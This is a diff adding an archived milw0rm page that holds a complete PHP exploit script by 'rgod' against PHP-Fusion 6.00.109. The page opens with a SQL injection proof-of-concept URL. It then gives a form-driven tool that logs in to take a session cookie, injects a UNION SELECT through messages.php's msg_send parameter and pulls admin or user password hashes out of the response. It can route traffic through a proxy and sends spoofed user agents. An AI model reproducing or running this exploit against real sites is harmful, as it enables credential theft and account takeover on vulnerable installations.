@@ -1,0 +1,205 @@
+<html>
+<head>
+<title>PHP-Fusion 6.00.109 (msg_send) SQL Injection Exploit</title>
+<pre>
+&lt;php
+# if magic_quotes off -&gt; SQL Injection, poc:
+#
+# http://[target]/[path_to_Php_Fusion]/messages.php?msg_send=' UNION SELECT user_password FROM fusion_users WHERE user_name='[admin_username]'/*
+## inserted the above for a better description /str0ke
+#
+#   19.17 28/09/2005                                                           #
+#                                                                              #
+#   -- PhpF6_00_109xpl.php                                                     #
+#                                                                              #
+#   PHP-Fusion v6.00.109 SQL Injection / admin|users credentials disclosure    #
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   mphhh, private messages again...tze,tze                                    #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   go!                                                                        #
+#                                                                              #
+#   Sun-Tzu: &quot;Therefore the clever combatant imposes his will on the enemy,    #
+#   but does not allow the enemy's will to be imposed on him&quot;                  #
+
+error_reporting(0);
+ini_set(&quot;max_execution_time&quot;,0);
+ini_set(&quot;default_socket_timeout&quot;, 2);
+ob_implicit_flush (1);
+
+echo'&lt;head&gt;&lt;title&gt; *** PHP-Fusion  v6.00.109  SQL  Injection ***  &lt;/title&gt; &lt;meta
+http-equiv= &quot;Content-Type&quot;   content=&quot;text/html;   charset=iso-8859-1&quot;&gt;   &lt;style
+type=&quot;text/css&quot;&gt;&lt;!-- body,td,th {color:#00FF00;} body{background-color: #000000;}
+.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
+.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
+font-style: italic; } --&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p class=&quot;Stile6&quot;&gt; Php-Fusion v6.
+00.109  SQL Injection / admin|user credentials disclosure &lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;
+a script  by rgod at &lt;a href=&quot;http://rgod.altervista.org&quot;       target=&quot;_blank&quot;&gt;
+http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt;&lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;43%&quot;&gt;  &lt;form
+name=&quot;form1&quot;  method=&quot;post&quot;  action=&quot;'.$SERVER[PHP_SELF].'?path=value&amp;host=value
+&amp;port=value&amp;proxy=value&amp;user=value&amp;pass=value&amp;username=value&quot;&gt;   &lt;p&gt;      &lt;input
+type=&quot;text&quot; name=&quot;host&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; hostname ( ex:  www.sitename.com )
+&lt;/span&gt;&lt;/p&gt; &lt;p&gt; &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;  path  (ex:
+/phpfusion/ or just /)&lt;/span&gt;&lt;/p&gt;&lt;p&gt; &lt;input  type=&quot;text&quot;  name=&quot;port&quot;&gt;     &lt;span
+class=&quot;Stile5&quot;&gt;specify a port other than 80 (default value)&lt;/span&gt;&lt;/p&gt;&lt;p&gt; &lt;input
+type=&quot;text&quot; name=&quot;user&quot;&gt; &lt;span  class=&quot;Stile5&quot;&gt;your username &lt;/span&gt; &lt;/p&gt;    &lt;p&gt;
+&lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt; &lt;span  class=&quot;Stile5&quot;&gt;your password ( to  get  a
+valid session cookie) &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;    &lt;span
+class=&quot;Stile5&quot;&gt;user  whom you want the password &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot;
+name=&quot;proxy&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt; send  exploit  trough  an HTTP proxy &lt;/span&gt;
+&lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot;name=&quot;Submit&quot;  value=&quot;go!&quot;&gt; &lt;/p&gt;&lt;/form&gt; &lt;/td&gt; &lt;/tr&gt;
+&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
+while ($ii &lt;= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
+             for ($li=0; $li&lt;=15; $li++)
+                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
+			    }
+            $ki=$ki+16;
+            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
+            }
+if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
+{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
+$ii++;
+$ji++;
+}
+for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
+                       }
+
+for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
+                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
+			    }
+echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket()
+{
+global $proxy, $host, $port, $html, $packet;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -&gt; not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+           echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
+           $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+ 		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,2048);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+
+if (($path&lt;&gt;'') and ($host&lt;&gt;'') and ($user&lt;&gt;'') and ($pass&lt;&gt;'') and ($username&lt;&gt;''))
+{
+  if ($port=='') {$port=80;}
+
+#STEP 1 -&gt; login, to retrieve a session cookie...
+
+$data=&quot;user_name=&quot;.urlencode(trim($user)).&quot;&amp;user_pass=&quot;.urlencode(trim($pass)).&quot;&amp;login=Login&quot;;
+if ($proxy=='')
+{$packet=&quot;POST &quot;.$path.&quot;news.php HTTP/1.1\r\n&quot;;}
+else
+{$packet=&quot;POST http://&quot;.$host.$path.&quot;news.php HTTP/1.1\r\n&quot;;}
+
+$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n&quot;;
+$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/news.php\r\n&quot;;
+$packet.=&quot;Accept-Language: en\r\n&quot;;
+$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
+$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
+$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
+$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
+$packet.=&quot;Connection: Keep-Alive\r\n&quot;;
+$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
+$packet.=&quot;Cookie: fusion_visited=yes; PHPSESSID=44ab49664b56b97036425427b1ffb8cf\r\n\r\n&quot;;
+$packet.=$data;
+show($packet);
+sendpacket($packet);
+$temp=explode(&quot;Set-Cookie: &quot;,$html);
+$temp2=explode(' ',$temp[1]);
+$cookie=$temp2[0];
+echo '&lt;br&gt;Your cookie: '.htmlentities($cookie);
+
+# STEP 2 -&gt; SQL Injection, now retrieve the MD5 password hash from database
+$username=str_replace(&quot;'&quot;,&quot;&quot;,$username);
+$sql=&quot;' UNION SELECT user_password FROM fusion_users WHERE user_name='&quot;.trim($username).&quot;'/*&quot;;
+
+if ($proxy=='')
+{$packet=&quot;GET &quot;.$path.&quot;messages.php?msg_send=&quot;.urlencode($sql).&quot; HTTP/1.1\r\n&quot;;}
+else
+{$packet=&quot;GET http://&quot;.$host.$path.&quot;messages.php?msg_send=&quot;.urlencode($sql).&quot; HTTP/1.1\r\n&quot;;}
+
+$packet.=&quot;User-Agent: GameBoy, Powered by Nintendo\r\n&quot;;
+$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+$packet.=&quot;Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n&quot;;
+$packet.=&quot;Accept-Language: en\r\n&quot;;
+$packet.=&quot;Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n&quot;;
+$packet.=&quot;Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n&quot;;
+$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
+$packet.=&quot;Cookie2: \$Version=1\r\n&quot;;
+$packet.=&quot;Connection: Keep-Alive, TE\r\n&quot;;
+$packet.=&quot;TE: deflate, gzip, chunked, identity, trailers\r\n\r\n&quot;;
+show($packet);
+sendpacket($packet);
+if (eregi('For Members only',$html)) {echo 'You have to specify a valid session cookie...'; die; }
+$temp=explode(&quot;'Click to view the senders profile'&gt;&quot;,$html);
+$temp2=explode(&quot;&lt;/a&gt;&quot;,$temp[1]);
+$hash=$temp2[0];
+echo '&lt;br&gt;Username: '.htmlentities($username).' Password hash: '.$hash;
+
+}
+else
+{ echo '&lt;br&gt; Fill requested fields, optionally specify a proxy...';}
+
+?&gt;
+
+# milw0rm.com [2005-09-28]
+</pre>
+</html>
+
